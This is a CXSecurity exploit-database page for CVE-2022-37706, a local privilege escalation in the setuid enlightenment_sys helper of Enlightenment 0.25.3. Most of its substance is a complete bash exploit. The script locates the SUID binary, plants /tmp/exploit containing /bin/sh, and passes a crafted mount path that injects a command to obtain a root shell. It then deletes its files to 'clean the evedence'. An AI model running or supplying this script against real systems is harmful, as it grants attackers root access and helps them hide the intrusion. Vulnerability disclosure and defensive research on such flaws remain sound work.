---
title: Enlightenment 0.25.3 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2022120046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-28
fetch_date: 2025-10-04T02:34:16.922356
---

# Enlightenment 0.25.3 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Enlightenment 0.25.3 Privilege Escalation** **2022.12.27**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2022-37706](https://cxsecurity.com/cveshow/CVE-2022-37706/ "Click to see CVE-2022-37706")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

## Title: Enlightenment Version: 0.25.3 LPE
## Author: nu11secur1ty
## Date: 12.26.2022
## Vendor: https://www.enlightenment.org/
## Software: https://www.enlightenment.org/download
## Reference: https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706
## Description:
The Enlightenment Version: 0.25.3 is vulnerable to local privilege escalation.
Enlightenment\_sys in Enlightenment before 0.25.4 allows local users to
gain privileges because it is setuid root,
and the system library function mishandles pathnames that begin with a
/dev/.. substring
If the attacker has access locally to some machine on which the
machine is installed Enlightenment
he can use this vulnerability to do very dangerous stuff.
## STATUS: CRITICAL Vulnerability
## Tested on:
```bash
DISTRIB\_ID=Ubuntu
DISTRIB\_RELEASE=22.10
DISTRIB\_CODENAME=kinetic
DISTRIB\_DESCRIPTION="Ubuntu 22.10"
PRETTY\_NAME="Ubuntu 22.10"
NAME="Ubuntu"
VERSION\_ID="22.10"
VERSION="22.10 (Kinetic Kudu)"
VERSION\_CODENAME=kinetic
ID=ubuntu
ID\_LIKE=debian
HOME\_URL="https://www.ubuntu.com/"
SUPPORT\_URL="https://help.ubuntu.com/"
BUG\_REPORT\_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY\_POLICY\_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU\_CODENAME=kinetic
LOGO=ubuntu-logo
```
[+] Exploit:
```bash
#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty
echo "CVE-2022-37706"
echo "[\*] Trying to find the vulnerable SUID file..."
echo "[\*] This may take few seconds..."
# The actual problem
file=$(find / -name enlightenment\_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
echo "[-] Couldn't find the vulnerable SUID file..."
echo "[\*] Enlightenment should be installed on your system."
exit 1
fi
echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"
${file} /bin/mount -o
noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u),
"/dev/../tmp/;/tmp/exploit" /tmp///net
read -p "Press any key to clean the evedence..."
echo -e "Please wait... "
sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706)
## Proof and Exploit:
[href](https://streamable.com/zflbgg)
## Time spent
`01:00:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top